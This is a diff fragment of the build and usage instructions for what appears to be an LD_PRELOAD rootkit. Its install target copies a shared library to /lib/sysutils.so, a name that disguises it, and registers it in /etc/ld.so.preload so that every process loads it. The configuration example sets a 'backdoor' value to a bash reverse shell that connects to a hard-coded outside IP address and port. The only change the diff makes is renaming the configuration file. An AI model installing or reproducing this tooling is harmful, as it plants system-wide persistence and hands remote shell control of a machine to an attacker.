@@ -18,12 +18,12 @@ dist/loader.so: $(SRCS) $(HEADERS)
 	gcc -shared -fPIC $(SRCS) -o $@ -ldl -lconfig -nostartfiles
 
 install:
-	cp uroot.cfg /etc/uroot.cfg
+	cp ukk_root.cfg /etc/ukk_root.cfg
 	cp dist/loader.so /lib/sysutils.so 
 	echo /lib/sysutils.so > /etc/ld.so.preload
 ```
 ## USE
-uroot.cfg:
+ukk_root.cfg:
 ```shell
 backdoor = "bash -c 'bash -i >& /dev/tcp/123.249.89.38/50001 0>&1'";
 
